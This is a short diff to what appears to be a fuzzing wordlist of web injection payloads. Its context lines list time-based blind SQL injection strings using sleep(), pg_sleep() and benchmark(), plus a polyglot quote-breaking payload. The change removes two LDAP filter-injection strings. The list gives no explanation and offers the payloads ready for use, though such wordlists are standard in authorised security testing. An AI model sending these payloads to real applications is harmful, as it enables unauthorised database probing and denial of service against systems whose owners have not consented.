@@ -79,8 +79,6 @@
 (select(0)from(select(sleep(25)))v)
 (select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/
 )pg_sleep(20)
-*(|(mail=*))
-*(|(objectclass=*))
 +(select*from(select(sleep(15)))a)+'
 +1=benchmark(40000000,sha(1))+and+1
 +and+1234567890=1234567890
